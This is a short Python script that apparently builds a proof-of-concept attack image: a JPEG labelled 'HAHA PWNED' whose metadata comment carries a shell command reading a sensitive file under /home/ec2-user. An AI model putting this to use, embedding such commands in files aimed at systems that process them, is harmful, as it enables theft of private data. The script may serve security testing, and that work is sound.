from PIL import Image, ImageDraw

def create_image_with_command(command, filename):
    # Create a blank image
    image = Image.new('RGB', (300, 100), color=(255, 255, 255))

    # Draw the text "HAHA PWNED" on the image
    image_draw = ImageDraw.Draw(image)
    image_draw.text((10, 40), "HAHA PWNED", fill='black')

    # Save the image with command as metadata comment
    image.save(filename, "JPEG", quality=95, comment=command)

if __name__ == "__main__":
    command = "cat /home/ec2-user/sensitive_data.txt"  # Command to embed
    filename = "haha_pwned.jpeg"
    create_image_with_command(command, filename)
    print(f"Image created with command: '{command}' and saved as '{filename}'")
